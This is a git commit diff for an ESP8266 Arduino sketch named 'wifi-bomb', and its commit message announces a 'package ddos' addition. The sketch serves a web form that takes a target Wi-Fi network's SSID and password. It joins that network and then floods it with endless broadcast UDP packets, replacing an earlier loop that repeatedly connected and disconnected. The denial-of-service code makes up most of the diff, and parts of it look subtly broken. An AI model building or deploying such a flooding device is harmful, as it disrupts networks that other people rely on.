b7131f45bc9abd33ba10a1f2486ec9670eb58137
Jordan Marques <jordanmarques1994@gmail.com>
2017-03-16 12:38:57 +0100

    fix : wifi conection, add : package ddos

--- wifi-bomb.ino
+++ wifi-bomb.ino
@@ -1,16 +1,56 @@
+
+#ifdef ESP8266
+extern "C" {
+#include "user_interface.h"
+}
+#endif
+
 #include <ESP8266WiFi.h>
-#include <WiFiClient.h> 
 #include <ESP8266WebServer.h>
-#include <SPI.h>
-#include <user_interface.h>
+#include <WiFiUdp.h>
 
 ESP8266WebServer server(80);
 
-extern "C" void __run_user_rf_pre_init(void) {
+
+void setup() { 
+ Serial.begin(115200);
+
+ //connectWifi("PIMOUSSE", "jojolalala");
+ 
+ configureAccesPoint();
+ configureLED();
+}
+
+void loop() {
+	server.handleClient();
+}
+
+/* Go to http://192.168.4.1 in a web browser
+ */
+void configureAccesPoint(){
+
+  const char *ssid = "Wifi-Bomb";
+  const char *password = "azertyuiop";
   
-  WiFi.mode(WIFI_AP_STA);
-  uint8_t mac[] = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05};
-  wifi_set_macaddr(SOFTAP_IF, &mac[0]);
+  Serial.println();
+  Serial.println("Configuring access point...");
+  WiFi.softAP(ssid, password);
+
+  IPAddress myIP = WiFi.softAPIP();
+  Serial.print("AP IP address: ");
+  Serial.println(myIP);
+  server.on("/", handleRoot);
+  server.on("/bomb", handleBomb);
+  server.begin();
+  Serial.println("HTTP server started");  
+}
+
+void configureLED(){
+  Serial.println("");
+  Serial.println("Configuring LED");
+  pinMode(LED_BUILTIN, OUTPUT);
+  digitalWrite(LED_BUILTIN, HIGH);
+  Serial.println("LED Configured");
 }
 
 void handleRoot() {
@@ -22,8 +62,7 @@ void handleRoot() {
     <br>SSID:<br>\
     <input type='text' name='SSID'><br>Password:<br>\
     <input type='text' name='Password'><br>Mac-Address:<br>\
-    <input type='text' name='Mac-address'><br><br>\
-    <button type='submit' name='toggle'> Bomb This </button>\
+    <button type='submit'> Bomb This </button>\
   </form>\
   </body> </html>\
   ";
@@ -39,73 +78,59 @@ void handleBomb(){
   char password[50];
 
   server.arg(0).toCharArray(ssid, 50);
-  server.arg(1).toCharArray(ssid, 50);
+  server.arg(1).toCharArray(password, 50);
 
-  bomb(ssid, password, "");
+  bomb(ssid, password);
 }
 
-void bomb(char ssid[], char password[], String amac){
-    
-  Serial.println(WiFi.macAddress());
+void bomb(char* ssid, char* password){
 
-  while(true){
-    WiFi.begin(ssid, password);
-    Serial.println("Wifi: Connected");
-    blink();
-    
-    delay(5000);
-    
-    WiFi.disconnect();
-    Serial.println("Wifi: Disconnected");
-    blink();
+   Serial.println("");
+   Serial.print("Bomb : ");
+   Serial.println(ssid);
+   connectWifi(ssid, password);
 
-    delay(2000);
-  }
+   uint8_t pkt[1000];
+   memset(pkt, 0, sizeof(pkt));
+
+   while(true){
+    WiFiUDP udp;
+    udp.beginPacketMulticast(WiFi.softAPIP(), 1, IPAddress(255,255,255,255), 1);
+    udp.write(pkt, sizeof(pkt));
+    udp.endPacket();
+   }
+   
+}
+
+void connectWifi(char* ssid, char* password){
   
+  WiFi.begin(ssid, password);
+
+  Serial.println("");
+  Serial.print("Try to connect ");
+  while (WiFi.status() != WL_CONNECTED) {
+    delay(500);
+    Serial.print(".");
+  }
+  Serial.println("");
+  Serial.println("WiFi connected");  
+  Serial.print("IP address: ");
+  Serial.println(WiFi.localIP());
+}
+
+void disconnectWifi(){
+   Serial.println("");
+   Serial.print("Try to disconnect ");
+   while (WiFi.status() == WL_CONNECTED) {
+    delay(500);
+    Serial.print(".");
+  }
+   Serial.println("Wifi Disconnected");
 }
 
 void blink(){
   digitalWrite(LED_BUILTIN, LOW);
   delay(1000);
-  digitalWrite(LED_BUILTIN, HIGH);
-}
-
-void setup() {
-  Serial.begin(115200);
-	configureAccesPoint();
-  configureLED();
-
-  __run_user_rf_pre_init();
-  Serial.println(WiFi.macAddress());
-}
-
-void loop() {
-	server.handleClient();
-}
-
-/* Go to http://192.168.4.1 in a web browser
- */
-void configureAccesPoint(){
-
-  const char *ssid = "Wifi-Bomb";
-  const char *password = "azertyuiop";
-  
-  Serial.println();
-  Serial.print("Configuring access point...");
-  WiFi.softAP(ssid, password);
-
-  IPAddress myIP = WiFi.softAPIP();
-  Serial.print("AP IP address: ");
-  Serial.println(myIP);
-  server.on("/", handleRoot);
-  server.on("/bomb", handleBomb);
-  server.begin();
-  Serial.println("HTTP server started");  
-}
-
-void configureLED(){
-  Serial.println("Configuring LED");
-  pinMode(LED_BUILTIN, OUTPUT);
   digitalWrite(LED_BUILTIN, HIGH);
 }
 
